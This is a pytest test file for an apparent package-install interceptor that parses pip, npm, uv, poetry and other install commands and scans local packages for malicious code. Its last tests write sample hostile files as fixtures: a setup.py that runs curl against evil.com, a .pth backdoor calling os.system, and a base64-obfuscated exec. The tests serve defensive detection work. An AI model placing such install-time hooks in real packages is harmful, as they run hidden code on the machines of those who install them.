from vibefort.interceptor import (
    parse_install_args, run_intercept, get_registry,
    ALLOWED_MANAGERS, _scan_local_path,
)


# --- pip ---

def test_parse_install_args_simple():
    packages = parse_install_args(["install", "flask"])
    assert packages == [("flask", "")]


def test_parse_install_args_with_version():
    packages = parse_install_args(["install", "flask==3.1.0"])
    assert packages == [("flask", "3.1.0")]


def test_parse_install_args_multiple():
    packages = parse_install_args(["install", "flask", "requests", "numpy"])
    assert len(packages) == 3


def test_parse_install_args_not_install():
    packages = parse_install_args(["list"])
    assert packages == []


def test_parse_install_args_with_flags():
    packages = parse_install_args(["install", "--upgrade", "flask", "-q"])
    assert packages == [("flask", "")]


def test_parse_install_args_requirements_file():
    packages = parse_install_args(["install", "-r", "requirements.txt"])
    assert packages == []


# --- npm ---

def test_parse_install_args_npm_simple():
    packages = parse_install_args(["install", "express"], manager="npm")
    assert packages == [("express", "")]


def test_parse_install_args_npm_with_version():
    packages = parse_install_args(["install", "express@4.18.0"], manager="npm")
    assert packages == [("express", "4.18.0")]


def test_parse_install_args_npm_add():
    packages = parse_install_args(["add", "lodash"], manager="npm")
    assert packages == [("lodash", "")]


def test_parse_install_args_npm_scoped():
    packages = parse_install_args(["install", "@angular/core"], manager="npm")
    assert packages == [("@angular/core", "")]


# --- npx / bunx ---

def test_parse_install_args_npx():
    packages = parse_install_args(["cowsay"], manager="npx")
    assert packages == [("cowsay", "")]


def test_parse_install_args_npx_with_version():
    packages = parse_install_args(["create-react-app@5.0.0"], manager="npx")
    assert packages == [("create-react-app", "5.0.0")]


def test_parse_install_args_npx_with_flags():
    packages = parse_install_args(["--yes", "cowsay", "hello"], manager="npx")
    assert packages == [("cowsay", "")]


def test_parse_install_args_bunx():
    packages = parse_install_args(["cowsay"], manager="bunx")
    assert packages == [("cowsay", "")]


# --- yarn / pnpm / bun ---

def test_parse_install_args_yarn_add():
    packages = parse_install_args(["add", "express"], manager="yarn")
    assert packages == [("express", "")]


def test_parse_install_args_pnpm_add():
    packages = parse_install_args(["add", "express@4.0.0"], manager="pnpm")
    assert packages == [("express", "4.0.0")]


def test_parse_install_args_bun_add():
    packages = parse_install_args(["add", "express"], manager="bun")
    assert packages == [("express", "")]


# --- uv ---

def test_parse_install_args_uv_pip_install():
    packages = parse_install_args(["pip", "install", "flask"], manager="uv")
    assert packages == [("flask", "")]


def test_parse_install_args_uv_add():
    packages = parse_install_args(["add", "flask"], manager="uv")
    assert packages == [("flask", "")]


def test_parse_install_args_uv_non_install():
    packages = parse_install_args(["run", "pytest"], manager="uv")
    assert packages == []


# --- pipx ---

def test_parse_install_args_pipx():
    packages = parse_install_args(["install", "black"], manager="pipx")
    assert packages == [("black", "")]


# --- poetry ---

def test_parse_install_args_poetry_add():
    packages = parse_install_args(["add", "flask"], manager="poetry")
    assert packages == [("flask", "")]


def test_parse_install_args_poetry_add_version():
    packages = parse_install_args(["add", "flask==3.1.0"], manager="poetry")
    assert packages == [("flask", "3.1.0")]


def test_parse_install_args_poetry_non_add():
    packages = parse_install_args(["install"], manager="poetry")
    assert packages == []


# --- pdm ---

def test_parse_install_args_pdm_add():
    packages = parse_install_args(["add", "requests"], manager="pdm")
    assert packages == [("requests", "")]


def test_parse_install_args_pdm_non_add():
    packages = parse_install_args(["install"], manager="pdm")
    assert packages == []


# --- get_registry ---

def test_get_registry_pip():
    assert get_registry("pip") == "pip"

def test_get_registry_npm():
    assert get_registry("npm") == "npm"

def test_get_registry_yarn():
    assert get_registry("yarn") == "npm"

def test_get_registry_poetry():
    assert get_registry("poetry") == "pip"

def test_get_registry_unknown():
    assert get_registry("unknown") == "pip"


# --- ALLOWED_MANAGERS ---

def test_allowed_managers_contains_all():
    expected = {"pip", "uv", "pipx", "poetry", "pdm", "npm", "npx", "yarn", "pnpm", "bun", "bunx"}
    assert expected == set(ALLOWED_MANAGERS)


# --- run_intercept rejects unknown managers ---

def test_run_intercept_rejects_unknown_manager(capsys):
    exit_code = run_intercept("evil_binary", ["install", "something"])
    assert exit_code == 1
    captured = capsys.readouterr()
    assert "unknown" in captured.err.lower()


# --- _scan_local_path ---

def test_scan_local_path_clean(tmp_path):
    (tmp_path / "setup.py").write_text('from setuptools import setup\nsetup(name="clean")\n')
    result = _scan_local_path(tmp_path)
    assert result.safe is True

def test_scan_local_path_malicious(tmp_path):
    (tmp_path / "setup.py").write_text('import subprocess\nsubprocess.call(["curl", "http://evil.com"])\n')
    result = _scan_local_path(tmp_path)
    assert result.safe is False
    assert result.evidence  # Should have evidence lines

def test_scan_local_path_pth_backdoor(tmp_path):
    (tmp_path / "evil.pth").write_text('import os; os.system("bad")')
    result = _scan_local_path(tmp_path)
    assert result.safe is False

def test_scan_local_path_obfuscated(tmp_path):
    (tmp_path / "payload.py").write_text('import base64; exec(base64.b64decode("aW1wb3J0IG9z"))')
    result = _scan_local_path(tmp_path)
    assert result.safe is False
